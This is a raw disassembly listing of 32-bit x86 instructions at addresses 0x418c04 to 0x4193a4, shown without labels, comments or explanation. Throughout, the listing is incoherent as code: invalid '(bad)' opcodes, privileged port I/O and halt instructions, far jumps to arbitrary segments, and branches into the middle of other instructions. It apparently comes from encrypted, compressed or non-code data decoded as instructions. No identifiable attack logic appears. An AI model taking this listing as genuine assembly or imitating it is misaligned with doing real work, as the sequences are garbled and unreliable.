  418c04:	bound  edi,QWORD PTR [edx+0x58]
  418c07:	aas    
  418c08:	push   ss
  418c09:	out    0xc6,eax
  418c0b:	in     al,dx
  418c0c:	je     0x418c27
  418c0e:	repnz loop 0x418bc2
  418c11:	retf   
  418c12:	lea    ecx,[ecx+0x1c]
  418c15:	retf   0xccc9
  418c18:	mov    bl,0xd2
  418c1a:	jae    0x418c28
  418c1c:	push   es
  418c1d:	pusha  
  418c1e:	lock clc 
  418c20:	adc    ch,BYTE PTR [esi]
  418c22:	inc    esi
  418c23:	inc    ebp
  418c24:	es cs nop
  418c27:	xor    eax,0x543dcddd
  418c2c:	add    bh,al
  418c2e:	pop    esp
  418c2f:	test   DWORD PTR [edi-0x73],eax
  418c32:	pop    esp
  418c33:	ror    DWORD PTR es:[ecx-0x1bd3cf7e],0x89
  418c3b:	outs   dx,BYTE PTR ds:[esi]
  418c3c:	sbb    DWORD PTR cs:[ebx+eiz*4],esi
  418c40:	sub    dl,BYTE PTR [edx-0x16c4fd07]
  418c46:	adc    al,0x52
  418c48:	(bad)  
  418c49:	aad    0xb0
  418c4b:	or     ebx,ebp
  418c4d:	dec    ecx
  418c4e:	cmp    eax,esp
  418c50:	fstp   QWORD PTR [esi-0x41]
  418c53:	xchg   al,dh
  418c55:	(bad)  
  418c56:	mov    edx,0xf42b7684
  418c5b:	push   edi
  418c5c:	add    eax,0x8e0e3c44
  418c61:	scas   eax,DWORD PTR es:[edi]
  418c62:	or     eax,0x7f9a1a0c
  418c67:	ds or  eax,0x6aa71c12
  418c6d:	hlt    
  418c6e:	pop    edx
  418c6f:	cmp    BYTE PTR [edi+0x2f],dh
  418c72:	mov    ds:0x42278db0,al
  418c77:	jne    0x418c1c
  418c79:	and    al,0x4f
  418c7b:	xchg   esi,eax
  418c7c:	std    
  418c7d:	adc    DWORD PTR [ebp+0x21e68253],edi
  418c83:	lock inc edi
  418c86:	xor    al,0x6d
  418c88:	jg     0x418d09
  418c8a:	and    BYTE PTR [edx-0x71],bh
  418c8d:	dec    ebp
  418c8e:	fsin   
  418c90:	aas    
  418c91:	jmp    0x418cda
  418c93:	add    al,0x13
  418c95:	retf   
  418c96:	mov    ah,0xa2
  418c98:	stos   DWORD PTR es:[edi],eax
  418c99:	push   esp
  418c9a:	or     bl,bl
  418c9c:	mov    ebx,0xf7148ae8
  418ca1:	or     BYTE PTR [ecx-0x19d7e38c],0xee
  418ca8:	xor    esi,ebx
  418caa:	add    bh,al
  418cac:	jl     0x418cf6
  418cae:	mov    edi,0x6485db8d
  418cb3:	ss js  0x418cfa
  418cb6:	adc    eax,0x4d80d779
  418cbb:	imul   ebx,ebp,0x55
  418cbe:	sbb    ah,BYTE PTR [ebp-0x2a]
  418cc1:	popf   
  418cc2:	mov    bh,0xf0
  418cc4:	adc    esi,eax
  418cc6:	lock xchg ecx,edi
  418cc9:	nop
  418cca:	int3   
  418ccb:	cwde   
  418ccc:	add    DWORD PTR [eax+edi*2-0x2feec995],ebx
  418cd3:	outs   dx,BYTE PTR ds:[esi]
  418cd4:	ja     0x418cf2
  418cd6:	dec    ecx
  418cd7:	adc    BYTE PTR [esi],dl
  418cd9:	inc    ebx
  418cda:	test   DWORD PTR [edi],edi
  418cdc:	xchg   esp,eax
  418cdd:	inc    eax
  418cde:	hlt    
  418cdf:	cdq    
  418ce0:	arpl   WORD PTR [ecx+ebx*4-0x32bd4c6d],dx
  418ce7:	mov    edi,DWORD PTR [ebx-0x9d69f64]
  418ced:	nop
  418cee:	cmp    BYTE PTR [ebx+esi*1+0x14],dh
  418cf2:	fwait
  418cf3:	sbb    ebp,DWORD PTR [edx+ecx*2+0x57de9304]
  418cfa:	shl    BYTE PTR [ecx+0x50f8f6ca],0xca
  418d01:	jmp    0xb6e942a4
  418d06:	push   edi
  418d07:	mov    cl,BYTE PTR [ecx+0x5b127bcc]
  418d0d:	loope  0x418d23
  418d0f:	jnp    0x418d33
  418d11:	bound  edi,QWORD PTR [esp+edi*1]
  418d14:	arpl   WORD PTR [ecx+ebx*1],dx
  418d17:	jns    0x418d8a
  418d19:	cmp    DWORD PTR [esi-0x5f],esp
  418d1c:	cli    
  418d1d:	ins    DWORD PTR es:[edi],dx
  418d1e:	pop    esi
  418d1f:	push   0xffffffa6
  418d21:	jnp    0x418d7a
  418d23:	call   0xabb2:0x735a13b6
  418d2a:	sub    BYTE PTR [esi-0x64950b97],dh
  418d30:	rcr    BYTE PTR [ebp+0x7556fed5],0x56
  418d37:	ja     0x418dad
  418d39:	daa    
  418d3a:	pop    ds
  418d3b:	jne    0x418d45
  418d3d:	fcmovbe st,st(4)
  418d3f:	pop    ecx
  418d40:	adc    bh,cl
  418d42:	fdivr  QWORD PTR [edx+ebx*2]
  418d45:	mov    al,ds:0x47033e36
  418d4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d4b:	or     edi,DWORD PTR [ebx-0x23]
  418d4e:	and    BYTE PTR [esp+edi*8-0x55],0x54
  418d53:	sub    al,0xdc
  418d55:	sar    BYTE PTR [eax],1
  418d57:	sbb    bh,BYTE PTR [ebp+ebp*8-0x5b]
  418d5b:	push   edx
  418d5c:	jbe    0x418d2c
  418d5e:	hlt    
  418d5f:	and    BYTE PTR [edi-0xf13c569],al
  418d65:	loop   0x418d6e
  418d67:	sbb    DWORD PTR [edi],eax
  418d69:	es cmp al,0xfc
  418d6c:	push   0xd63ec023
  418d71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d72:	dec    ebp
  418d73:	mov    WORD PTR [esi+ebx*4-0x4c2d4d9f],fs
  418d7a:	sahf   
  418d7b:	cmp    edi,DWORD PTR [ecx-0x6fbab923]
  418d81:	pop    esp
  418d82:	xchg   edx,eax
  418d83:	push   ebx
  418d84:	ins    DWORD PTR es:[edi],dx
  418d85:	push   ecx
  418d86:	(bad)  
  418d88:	dec    edi
  418d89:	sar    DWORD PTR [ebx+ecx*1+0x41],0x9d
  418d8e:	add    al,0xd8
  418d90:	imul   esi,DWORD PTR [ebx-0x73],0xd1edc7ac
  418d97:	push   edx
  418d98:	jns    0x418d7a
  418d9a:	and    eax,0x3b8cfd4
  418d9f:	stos   BYTE PTR es:[edi],al
  418da0:	outs   dx,BYTE PTR ds:[esi]
  418da1:	and    eax,0xea0d8977
  418da6:	dec    edi
  418da7:	cmp    al,0x4c
  418da9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418daa:	stc    
  418dab:	dec    ebp
  418dac:	addr16 xor edi,eax
  418daf:	xor    al,0xef
  418db1:	rcr    BYTE PTR [eax],cl
  418db3:	inc    ecx
  418db4:	je     0x418da2
  418db6:	add    eax,0x181b6b91
  418dbb:	mov    bh,0x65
  418dbd:	mov    DWORD PTR [ecx-0x2babd60f],ebx
  418dc3:	jbe    0x418d95
  418dc5:	push   es
  418dc6:	dec    cx
  418dc8:	jno    0x418de9
  418dca:	xchg   ecx,eax
  418dcb:	scas   al,BYTE PTR es:[edi]
  418dcc:	jns    0x418e4d
  418dce:	pop    ss
  418dcf:	add    eax,0xb1f0f1ff
  418dd4:	dec    esi
  418dd5:	cdq    
  418dd6:	enter  0x58cc,0x3d
  418dda:	push   esi
  418ddb:	push   ds
  418ddc:	jecxz  0x418d9a
  418dde:	push   0x3fbee879
  418de3:	aas    
  418de4:	mov    ebp,0x4e4ef047
  418de9:	sbb    al,0x42
  418deb:	and    dl,BYTE PTR [ebx-0x54]
  418dee:	mov    ebp,0x2f564621
  418df3:	adc    ecx,DWORD PTR [edx+0xe]
  418df6:	fadd   DWORD PTR ds:0x9917dd55
  418dfc:	repz mov edx,0x4d41ee36
  418e02:	push   eax
  418e03:	adc    eax,0x64a9ad1e
  418e08:	inc    esi
  418e09:	fadd   st(0),st
  418e0b:	dec    esp
  418e0c:	xchg   DWORD PTR [esi],ebx
  418e0e:	pop    eax
  418e0f:	push   0x7b4f504e
  418e14:	sbb    BYTE PTR ds:0x548c9452,bl
  418e1a:	les    edi,FWORD PTR ds:0xf944459c
  418e20:	in     al,0xdd
  418e22:	fcomp  DWORD PTR [edi+0x29]
  418e25:	cmp    DWORD PTR ds:0x110e3495,edi
  418e2b:	aad    0x63
  418e2d:	sbb    DWORD PTR ds:0xf3761e7,eax
  418e33:	jns    0x418e28
  418e35:	test   BYTE PTR [edx+ebp*8+0x5b907764],ah
  418e3c:	jae    0x418e22
  418e3e:	or     DWORD PTR [ebp+0x6e],ebp
  418e41:	inc    ebp
  418e42:	popf   
  418e43:	lods   eax,DWORD PTR ds:[esi]
  418e44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e45:	mov    esi,0xf9eb2055
  418e4a:	adc    DWORD PTR [edi],edx
  418e4c:	test   ebp,edi
  418e4e:	cmp    al,0xa1
  418e50:	lea    ebp,[ecx-0x7260d0ed]
  418e56:	push   esi
  418e57:	mov    ds:0x9304ddac,al
  418e5c:	outs   dx,DWORD PTR ds:[esi]
  418e5d:	ret    
  418e5e:	inc    ebp
  418e5f:	mov    edx,0x5afa12ab
  418e64:	shl    BYTE PTR [ecx+0x4d683c28],1
  418e6a:	(bad)  
  418e6b:	icebp  
  418e6c:	mov    BYTE PTR [ebx],ah
  418e6e:	mov    DWORD PTR [ecx],edx
  418e70:	ss cmp al,0x6a
  418e73:	jmp    0x418e9b
  418e75:	mov    eax,edx
  418e77:	xchg   esp,eax
  418e78:	(bad)  
  418e79:	out    dx,al
  418e7a:	stc    
  418e7b:	dec    ebp
  418e7c:	iret   
  418e7d:	sahf   
  418e7e:	inc    esi
  418e7f:	sub    eax,0xad1d421b
  418e84:	icebp  
  418e85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e86:	xor    BYTE PTR [ebp+eiz*2+0x67ea8fb6],cl
  418e8d:	push   ss
  418e8e:	pop    eax
  418e8f:	xor    al,BYTE PTR [ebx]
  418e91:	gs nop
  418e93:	push   edi
  418e94:	aas    
  418e95:	push   cs
  418e96:	or     ah,BYTE PTR [edx-0x6b556652]
  418e9c:	daa    
  418e9d:	pop    edx
  418e9e:	or     dh,BYTE PTR [ebx+esi*2+0x58b15891]
  418ea5:	pop    edx
  418ea6:	pop    DWORD PTR [edx-0x7c]
  418ea9:	fstp   DWORD PTR [ecx+ebx*4+0x63]
  418ead:	call   0x7f15:0x3b6bf788
  418eb4:	dec    ecx
  418eb5:	in     al,0x25
  418eb7:	nop
  418eb8:	mov    esi,0x91e9076c
  418ebd:	repnz mov DWORD PTR [edi-0x38],edi
  418ec1:	inc    esp
  418ec2:	fidivr DWORD PTR [bx-0x26]
  418ec6:	add    BYTE PTR [ebx+0x3a6a0ddd],0xc6
  418ecd:	xchg   ebp,eax
  418ece:	das    
  418ecf:	repnz shr BYTE PTR [edx-0x7896bdae],1
  418ed6:	jl     0x418eab
  418ed8:	into   
  418ed9:	shl    BYTE PTR [ecx-0x79ca6428],1
  418edf:	sbb    DWORD PTR [ebp+0x39],ebp
  418ee2:	or     BYTE PTR [edx+eiz*8-0x1d],bh
  418ee6:	xchg   edi,eax
  418ee7:	adc    al,0xc9
  418ee9:	adc    DWORD PTR [edi-0x30],0x38
  418eed:	cmp    al,0xf5
  418eef:	arpl   WORD PTR [edi+0x1d],di
  418ef2:	fdivrp st(7),st
  418ef4:	rcl    DWORD PTR [ebp+0x7],1
  418ef7:	pop    ecx
  418ef8:	aas    
  418ef9:	test   BYTE PTR [ebp+0x3],0x72
  418efd:	sbb    DWORD PTR [edx+0x73],ecx
  418f00:	and    BYTE PTR [edi+ebx*8],dl
  418f03:	or     ebx,DWORD PTR [ebx+0x449fe62b]
  418f09:	lods   al,BYTE PTR ds:[esi]
  418f0a:	xchg   ecx,eax
  418f0b:	retf   0xe606
  418f0e:	fmul   DWORD PTR [esi]
  418f10:	fldenv [ebp+0x4a]
  418f13:	cs aam 0x89
  418f16:	dec    eax
  418f17:	mov    ebx,0xd70c931
  418f1c:	cwde   
  418f1d:	fild   DWORD PTR [eax+0x7302dfde]
  418f23:	cmp    DWORD PTR [esi+ecx*4],eax
  418f26:	or     BYTE PTR [esi],ah
  418f28:	and    eax,0x57fbe6ce
  418f2d:	icebp  
  418f2e:	sbb    eax,0x7f5d47d7
  418f33:	imul   eax,DWORD PTR [edi-0x27203efd],0xacb5463a
  418f3d:	pusha  
  418f3e:	repnz es pop ss
  418f41:	mov    edi,DWORD PTR [ebx-0x3e9677cb]
  418f47:	hlt    
  418f48:	dec    ecx
  418f49:	lock stos BYTE PTR es:[edi],al
  418f4b:	sub    ebx,DWORD PTR [esi+ebp*2-0xf]
  418f4f:	sbb    edx,ebx
  418f51:	retf   
  418f52:	bound  esi,QWORD PTR [edi+0x6aa92fbf]
  418f58:	jmp    0x418fa0
  418f5a:	dec    ecx
  418f5b:	mov    ecx,0x86a406b
  418f60:	cdq    
  418f61:	dec    ebx
  418f62:	sub    al,0x7
  418f64:	xor    al,0xf5
  418f66:	or     bl,BYTE PTR [edi+0x28]
  418f69:	push   cs
  418f6a:	and    DWORD PTR [ebx],ecx
  418f6c:	cmp    BYTE PTR [esi+0x1c],ch
  418f6f:	sub    esi,DWORD PTR [edi]
  418f71:	jae    0x418f6e
  418f73:	mov    ds:0xefe4ae35,eax
  418f78:	mov    esi,0xd49ddb69
  418f7d:	fwait
  418f7e:	test   ah,ah
  418f80:	mov    eax,ds:0x9ded9363
  418f85:	daa    
  418f86:	dec    ebp
  418f87:	mov    ds:0xf26df273,al
  418f8c:	add    BYTE PTR [esi-0x40bc38d6],ah
  418f92:	jecxz  0x418fc0
  418f94:	ror    DWORD PTR [eax-0x72020390],1
  418f9a:	jge    0x418f66
  418f9c:	cld    
  418f9d:	int    0x44
  418f9f:	fldcw  WORD PTR [ecx]
  418fa1:	or     ecx,esi
  418fa3:	mov    dl,0x89
  418fa5:	sbb    DWORD PTR [ebx+eiz*4],esp
  418fa8:	in     eax,0xba
  418faa:	mov    eax,0xdfd5aea7
  418faf:	dec    ecx
  418fb0:	xlat   BYTE PTR ds:[ebx]
  418fb1:	loopne 0x418f55
  418fb3:	or     eax,0x8aa8c925
  418fb8:	test   DWORD PTR [ebx+0x7e61e798],0x180dcd39
  418fc2:	mov    al,0xba
  418fc4:	sub    al,cl
  418fc6:	in     al,dx
  418fc7:	retf   0xe5ae
  418fca:	mov    ah,bl
  418fcc:	fwait
  418fcd:	retf   0x6ded
  418fd0:	push   edi
  418fd1:	js     0x418f82
  418fd3:	mov    eax,0x8cbd16e9
  418fd8:	retf   0xe1df
  418fdb:	fs stc 
  418fdd:	mov    DWORD PTR [eax+eiz*2-0x2a6c980b],ecx
  418fe4:	and    al,BYTE PTR [edi-0x3cdc7db]
  418fea:	jl     0x418fb2
  418fec:	adc    eax,0x3a52c59a
  418ff1:	mov    ah,0x60
  418ff3:	(bad)  
  418ff4:	aaa    
  418ff5:	lods   al,BYTE PTR ds:[esi]
  418ff6:	sbb    BYTE PTR [eax+ebx*1],0x7f
  418ffa:	or     ch,BYTE PTR [edx]
  418ffc:	push   esi
  418ffd:	cwde   
  418ffe:	sub    BYTE PTR [esi-0x7e],bh
  419001:	popf   
  419002:	dec    esp
  419003:	cmp    bh,bh
  419005:	rcl    edi,0x3e
  419008:	dec    eax
  419009:	rcr    DWORD PTR [ecx-0x5e],0x1e
  41900d:	xlat   BYTE PTR ds:[ebx]
  41900e:	neg    ecx
  419010:	xchg   ebx,eax
  419011:	mov    DWORD PTR [esp+eiz*4+0x1bbf872e],esp
  419018:	pop    DWORD PTR [ebx-0x4a49130e]
  41901e:	mov    ?,WORD PTR [eax]
  419020:	pusha  
  419021:	or     dh,BYTE PTR [esi-0x56]
  419024:	cmc    
  419025:	mov    DWORD PTR [ebx+0x54528ea2],edi
  41902b:	das    
  41902c:	test   BYTE PTR [esi-0x2d],cl
  41902f:	pop    edi
  419030:	retf   
  419031:	pop    edx
  419032:	ret    
  419033:	jne    0x418ff4
  419035:	mov    cl,0x78
  419037:	int3   
  419038:	mov    dl,0x3c
  41903a:	jnp    0x419077
  41903c:	mov    bh,0xb4
  41903e:	test   ah,al
  419040:	pusha  
  419041:	mov    ch,0x1a
  419043:	jg     0x418ff7
  419045:	inc    ebp
  419046:	out    dx,eax
  419047:	aam    0x60
  419049:	les    eax,FWORD PTR [ebx+0x73]
  41904c:	dec    ebx
  41904d:	mov    esi,0x7d7ed87b
  419052:	sbb    al,0x52
  419054:	jb     0x418ffe
  419056:	js     0x419014
  419058:	add    eax,0x8c4761a2
  41905d:	xor    DWORD PTR [eax],edi
  41905f:	das    
  419060:	jmp    0xd954:0xc12ba129
  419067:	adc    DWORD PTR [ebx],0x79
  41906a:	sub    ecx,DWORD PTR [edx+0x1a4f8143]
  419070:	loope  0x4190d8
  419072:	ffree  st(1)
  419074:	adc    al,0x5f
  419076:	jns    0x41900f
  419078:	lods   eax,DWORD PTR ds:[esi]
  419079:	inc    ebx
  41907a:	es loopne 0x41902d
  41907d:	in     al,0x5
  41907f:	into   
  419080:	dec    esp
  419081:	jecxz  0x41906c
  419083:	leave  
  419084:	fwait
  419085:	bound  ebx,QWORD PTR ds:0xa9e964b8
  41908b:	rol    esi,cl
  41908d:	fwait
  41908e:	xlat   BYTE PTR ds:[ebx]
  41908f:	clc    
  419090:	jmp    0x419026
  419092:	adc    eax,0xb1159379
  419097:	fistp  QWORD PTR [ebp-0x3f]
  41909a:	mov    dl,0x1
  41909c:	loope  0x4190ba
  41909e:	xor    DWORD PTR [ecx+0x130cad4b],esp
  4190a4:	mov    esp,0x24955d74
  4190a9:	mov    dl,0x48
  4190ab:	pusha  
  4190ac:	inc    ebx
  4190ad:	mul    DWORD PTR [ebp-0x134886ec]
  4190b3:	sbb    dl,BYTE PTR [ebx+esi*2-0x4c]
  4190b7:	dec    ecx
  4190b8:	ficom  WORD PTR [edi]
  4190ba:	add    eax,eax
  4190bc:	push   esi
  4190bd:	inc    ecx
  4190be:	shl    BYTE PTR [edi+0x5cffc21b],1
  4190c4:	push   es
  4190c5:	push   esp
  4190c6:	stos   DWORD PTR es:[edi],eax
  4190c7:	retf   
  4190c8:	add    al,BYTE PTR [edi-0x619dc464]
  4190ce:	out    dx,al
  4190cf:	cmp    ebx,esi
  4190d1:	fst    st(3)
  4190d3:	loopne 0x41909a
  4190d5:	jecxz  0x4190e7
  4190d7:	aad    0x63
  4190d9:	mov    ds:0x52738903,al
  4190de:	enter  0x9873,0x52
  4190e2:	push   es
  4190e3:	xchg   esi,eax
  4190e4:	add    al,0x5e
  4190e6:	xchg   edx,eax
  4190e7:	repz mov ds:0xb5e2e13b,al
  4190ed:	lods   eax,DWORD PTR ds:[esi]
  4190ee:	fnstsw WORD PTR [eax+0x58]
  4190f1:	dec    ebx
  4190f2:	push   cs
  4190f3:	push   ecx
  4190f4:	xchg   edx,eax
  4190f5:	sub    DWORD PTR [edx],0xf
  4190f8:	lea    ebp,[edi]
  4190fa:	xor    eax,0x13b2dec8
  4190ff:	adc    BYTE PTR [esi+0x6bc38277],0x55
  419106:	pusha  
  419107:	in     eax,dx
  419108:	mov    edx,0xf5ada4c7
  41910d:	in     al,dx
  41910e:	mov    WORD PTR ss:[edi+0x76],ss
  419112:	inc    edi
  419113:	dec    eax
  419114:	mov    ds:0xf418b696,eax
  419119:	xchg   esi,eax
  41911a:	dec    esp
  41911b:	scas   al,BYTE PTR es:[edi]
  41911c:	or     BYTE PTR [ebp+0x16],0xaa
  419120:	sub    DWORD PTR [eax],ecx
  419122:	out    0x92,eax
  419124:	(bad)  [ebx-0x768c48e5]
  41912a:	push   es
  41912b:	xor    bl,BYTE PTR [esi+0xa]
  41912e:	cli    
  41912f:	pop    ss
  419130:	push   edx
  419131:	xchg   BYTE PTR [eax],ah
  419133:	cld    
  419134:	lahf   
  419135:	mov    ds:0xf7718319,al
  41913a:	cli    
  41913b:	adc    BYTE PTR [eax+ecx*2],0xe1
  41913f:	cmp    al,0x5d
  419141:	ins    DWORD PTR es:[edi],dx
  419142:	mov    eax,0x81905458
  419147:	lea    esi,[esi+0x1c]
  41914a:	push   edi
  41914b:	gs ins DWORD PTR es:[edi],dx
  41914d:	popa   
  41914e:	arpl   WORD PTR [ebp+0x34d8e615],dx
  419154:	cmp    al,0x40
  419156:	add    al,0x72
  419158:	push   edi
  419159:	jnp    0x4190eb
  41915b:	lds    esp,FWORD PTR [edx+0x3b]
  41915e:	dec    ebp
  41915f:	inc    ebx
  419160:	push   edi
  419161:	fisttp QWORD PTR [esi]
  419163:	xchg   esi,eax
  419164:	inc    ebx
  419165:	adc    al,BYTE PTR [ebp-0x4b]
  419168:	fisttp QWORD PTR [ecx]
  41916a:	add    dh,BYTE PTR [ecx-0x49d080a2]
  419170:	(bad)  
  419172:	cmp    esp,DWORD PTR [ebp+0x212b404c]
  419178:	or     al,0x6e
  41917a:	xor    eax,0xf6d00316
  41917f:	test   al,0x19
  419181:	xchg   esp,ecx
  419183:	lods   eax,DWORD PTR ds:[esi]
  419184:	scas   al,BYTE PTR es:[edi]
  419185:	pop    ds
  419186:	bound  esp,QWORD PTR [ebp+ebp*4-0x6e6f74cf]
  41918d:	cld    
  41918e:	or     esp,eax
  419190:	aad    0x6d
  419192:	dec    eax
  419193:	scas   eax,DWORD PTR es:[edi]
  419194:	mov    ebp,0xba939c5
  419199:	scas   al,BYTE PTR es:[edi]
  41919a:	mov    ds:0x5f1a1265,eax
  41919f:	(bad)  
  4191a0:	js     0x4191fa
  4191a2:	not    BYTE PTR [edx]
  4191a4:	jg     0x4191ca
  4191a6:	mov    ch,0x2c
  4191a8:	xlat   BYTE PTR ds:[ebx]
  4191a9:	jns    0x41916a
  4191ab:	jbe    0x4191f2
  4191ad:	mov    eax,ds:0x70e2c563
  4191b2:	sbb    BYTE PTR [esi+ecx*2+0x4e],cl
  4191b6:	mov    edx,DWORD PTR [ebx+edi*4+0x1786e706]
  4191bd:	das    
  4191be:	and    al,0x54
  4191c0:	pop    esp
  4191c1:	push   ecx
  4191c2:	cli    
  4191c3:	cmp    DWORD PTR [esp+esi*2],edx
  4191c6:	cmp    BYTE PTR [eax-0x7d],cl
  4191c9:	iret   
  4191ca:	(bad)  
  4191cb:	jg     0x419209
  4191cd:	adc    ch,al
  4191cf:	aaa    
  4191d0:	retf   
  4191d1:	test   DWORD PTR [edx+0x41],ecx
  4191d4:	fisttp WORD PTR [ebx-0x5d010306]
  4191da:	rcr    BYTE PTR [eax-0x34b9d926],cl
  4191e0:	sbb    BYTE PTR [edx+0x39492035],cl
  4191e6:	in     eax,0x76
  4191e8:	cmc    
  4191e9:	jmp    0x419170
  4191eb:	sub    BYTE PTR [ecx+esi*8+0x55dc9492],cl
  4191f2:	ret    
  4191f3:	mov    ah,0xfd
  4191f5:	call   0x6a97a819
  4191fa:	jmp    0xfd7c94c4
  4191ff:	pop    ebx
  419200:	inc    edx
  419201:	fnstsw WORD PTR [ebp+ecx*2-0x74]
  419205:	and    BYTE PTR [edi-0x1cda940a],al
  41920b:	fwait
  41920c:	xchg   edx,eax
  41920d:	push   eax
  41920e:	pop    esi
  41920f:	int    0x2f
  419211:	sbb    ebp,esi
  419213:	in     al,0x31
  419215:	aaa    
  419216:	arpl   dx,bx
  419218:	dec    esp
  419219:	outs   dx,DWORD PTR ds:[esi]
  41921a:	jge    0x419214
  41921c:	es popa 
  41921e:	outs   dx,BYTE PTR ds:[esi]
  41921f:	repnz sbb eax,0xde8e9678
  419225:	cwde   
  419226:	(bad)  
  419228:	and    edx,0x1bd55fcc
  41922e:	ins    BYTE PTR es:[edi],dx
  41922f:	push   ebx
  419230:	aad    0x56
  419232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419233:	mov    ah,0x94
  419235:	and    eax,0x5087932c
  41923a:	loopne 0x419201
  41923c:	xchg   edi,eax
  41923d:	loopne 0x41923a
  41923f:	dec    ebx
  419240:	out    dx,al
  419241:	in     al,dx
  419242:	jo     0x419270
  419244:	jge    0x419272
  419246:	shr    BYTE PTR [ecx-0x53],1
  419249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41924a:	repz inc eax
  41924c:	jp     0x41924c
  41924e:	xchg   DWORD PTR [ebp-0x57dd88b3],edx
  419254:	adc    ebx,esp
  419256:	(bad)  
  419257:	and    al,0x94
  419259:	imul   esp,edx,0xd14e506f
  41925f:	repnz icebp 
  419261:	sbb    BYTE PTR [ecx-0x6c44694],bl
  419267:	inc    ebp
  419268:	in     eax,0xc2
  41926a:	jbe    0x41926f
  41926c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41926d:	pop    es
  41926e:	push   ds
  41926f:	dec    esi
  419270:	je     0x41925e
  419272:	xor    al,0x3b
  419274:	test   esi,ecx
  419276:	and    bh,BYTE PTR [eax]
  419278:	fbstp  TBYTE PTR [ecx+ecx*8+0x49]
  41927c:	push   ds
  41927d:	mov    esp,0xe538b179
  419282:	mov    ecx,cs
  419284:	jmp    0xa1de:0x20aee5d2
  41928b:	in     al,0xb5
  41928d:	or     BYTE PTR [edx+0x2d],bh
  419290:	lods   al,BYTE PTR ds:[esi]
  419291:	fmul   QWORD PTR [ebx]
  419293:	out    0x34,eax
  419295:	fisttp DWORD PTR [edi]
  419297:	ss sbb al,0xcf
  41929a:	sbb    esp,DWORD PTR [edx-0x42a4bc97]
  4192a0:	push   ecx
  4192a1:	adc    ch,BYTE PTR [eax+0x3e]
  4192a4:	cmp    eax,0x93a7b44e
  4192a9:	mov    esi,DWORD PTR [esi]
  4192ab:	in     al,0xac
  4192ad:	cdq    
  4192ae:	aaa    
  4192af:	js     0x4192be
  4192b1:	dec    eax
  4192b2:	imul   edx,DWORD PTR [ebx+eax*8],0xa41d1e97
  4192b9:	out    0x5a,eax
  4192bb:	mov    al,0xde
  4192bd:	xlat   BYTE PTR ds:[ebx]
  4192be:	fnstcw WORD PTR [edx+0x4f32c17f]
  4192c4:	fcom   DWORD PTR [esi]
  4192c6:	mov    ss,WORD PTR [edx]
  4192c8:	xlat   BYTE PTR ds:[ebx]
  4192c9:	jne    0x419343
  4192cb:	(bad)  
  4192cc:	fistp  QWORD PTR [ecx-0x2cc908e0]
  4192d2:	xchg   BYTE PTR [eax],ch
  4192d4:	xor    esi,edi
  4192d6:	repz ja 0x4192ee
  4192d9:	and    DWORD PTR [edx],eax
  4192db:	pop    es
  4192dc:	xchg   ecx,ebp
  4192de:	inc    edx
  4192df:	and    ecx,DWORD PTR [ecx+0x674cc263]
  4192e5:	bound  ecx,QWORD PTR [ebx+eiz*8-0x3340ef77]
  4192ec:	das    
  4192ed:	mov    ds:0x5d5eec36,al
  4192f2:	sub    DWORD PTR [edx+0x6b],ebp
  4192f5:	out    dx,al
  4192f6:	push   edi
  4192f7:	mov    BYTE PTR [edi-0x1be817a5],cl
  4192fd:	and    esi,DWORD PTR [ecx]
  4192ff:	in     al,dx
  419300:	sub    esi,ecx
  419302:	rcr    DWORD PTR [esi-0x21a67b42],1
  419308:	cld    
  419309:	shl    DWORD PTR [ebp+0x35],1
  41930c:	or     al,0x9a
  41930e:	sti    
  41930f:	loopne 0x4192a1
  419311:	js     0x41930f
  419313:	std    
  419314:	scas   eax,DWORD PTR es:[edi]
  419315:	push   cs
  419316:	add    eax,0xe625dcd9
  41931b:	cwde   
  41931c:	jg     0x41936a
  41931e:	ror    bl,cl
  419320:	sahf   
  419321:	cmp    al,0x26
  419323:	jno    0x419306
  419325:	test   al,0xa7
  419327:	ins    DWORD PTR es:[edi],dx
  419328:	stos   BYTE PTR es:[edi],al
  419329:	cmp    DWORD PTR [edx-0x5d9c4718],0xaa0b5699
  419333:	stos   BYTE PTR es:[edi],al
  419334:	push   cs
  419335:	cli    
  419336:	js     0x41934c
  419338:	sbb    al,0xd7
  41933a:	(bad)  
  41933b:	xor    dl,bl
  41933d:	test   eax,ecx
  41933f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419340:	pop    eax
  419341:	dec    esp
  419342:	xchg   esp,eax
  419343:	pushf  
  419344:	mov    al,ds:0x4dabc17e
  419349:	scas   eax,DWORD PTR es:[edi]
  41934a:	popa   
  41934b:	mov    ah,dh
  41934d:	or     edx,ebp
  41934f:	fst    QWORD PTR [edx+ebx*2]
  419352:	sbb    esi,ebx
  419354:	std    
  419355:	daa    
  419356:	or     ebx,ecx
  419358:	adc    BYTE PTR [ecx+esi*4],bl
  41935b:	adc    cl,BYTE PTR [eax-0x14]
  41935e:	dec    ebp
  41935f:	ins    BYTE PTR es:[edi],dx
  419360:	adc    cl,BYTE PTR [eax-0x29]
  419363:	lods   eax,DWORD PTR ds:[esi]
  419364:	fcomi  st,st(1)
  419366:	push   ecx
  419367:	inc    esi
  419368:	icebp  
  419369:	dec    ecx
  41936a:	nop    DWORD PTR [ebx]
  41936d:	sar    BYTE PTR [eax-0x13bf2e96],0x2d
  419374:	mov    ebx,edi
  419376:	xchg   ebx,eax
  419377:	push   esi
  419378:	xor    ch,BYTE PTR [esi]
  41937a:	cmp    edi,ebp
  41937c:	dec    esi
  41937e:	fnstenv [edi]
  419380:	pop    ss
  419381:	or     ebp,DWORD PTR [esi+0x65]
  419384:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419385:	cmp    DWORD PTR [ecx+edx*2],edx
  419388:	pop    es
  419389:	xchg   esp,eax
  41938a:	in     al,0x8f
  41938c:	aam    0xb8
  41938e:	cwde   
  41938f:	stos   DWORD PTR es:[edi],eax
  419390:	dec    ebx
  419391:	cld    
  419392:	mov    ds:0x5ed780cc,al
  419397:	push   esi
  419398:	xor    eax,0xdd803fad
  41939d:	add    edx,DWORD PTR [ebx-0x3c]
  4193a0:	xchg   ecx,eax
  4193a1:	push   0xffffff81
  4193a3:	(bad)  
  4193a4:	retf   
